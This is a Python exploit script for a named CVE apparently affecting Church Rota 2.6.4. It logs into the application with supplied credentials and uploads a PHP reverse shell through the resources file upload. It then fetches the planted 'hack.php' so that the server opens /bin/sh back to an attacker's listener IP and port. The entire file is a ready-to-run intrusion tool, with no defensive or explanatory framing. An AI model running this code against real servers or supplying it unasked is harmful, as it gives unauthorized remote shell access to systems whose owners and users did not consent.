import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2021-3164
# Church Rota version 2.6.4 is vulnerable to authenticated RCE.
class CVE2021_3164:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, uname, password, lhost, lport):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.uname, self.password = uname, password
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    # login with creds
    def login(self):
        print (LogColors.BLUE + "login with credentials..." + LogColors.ENDC)
        data = {"username" : self.uname, "password" : self.password}
        r = self.session.post(self.url + "/login.php", data = data)
        if r.ok:
            print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to login with credentials. exit" + LogColors.ENDC)
            sys.exit()

    # send payload. update file with rev shell php code
    def send_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        shell = "<?php $sock=fsockopen(\"{}\",{});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>".format(self.lhost, self.lport)
        headers = {"Referer" : "{}/resources.php?action=new".format(self.url)}
        self.session.headers.update(headers)
        files = {'resourcefile' : ("hack.php", shell)}
        r = self.session.post(self.url + "/resources.php?action=newsent", files = files)
        if r.ok:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()

    # check reverse shell
    def check(self):
        print (LogColors.BLUE + "check rev shell..." + LogColors.ENDC)
        r = self.session.get(self.url + "/documents/hack.php")
        print (LogColors.YELLOW + "shell: " + self.url + "/documents/hack.php :)" + LogColors.ENDC)
        if r.ok:
            print (LogColors.GREEN + "rev shell successfully checked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "check reverse shell failed :(" + LogColors.ENDC)
            sys.exit()

    # exploitation logic
    def exploit(self):
        self.login()
        self.send_payload()
        self.check()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-U','--username', required = True, help = "auth username")
    parser.add_argument('-P','--password', required = True, help = "auth password")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    uname, pwd = args['username'], args['password']
    ip, port = args['ip'], args['port']
    cve = CVE2021_3164(url, uname, pwd, ip, port)
    cve.exploit()

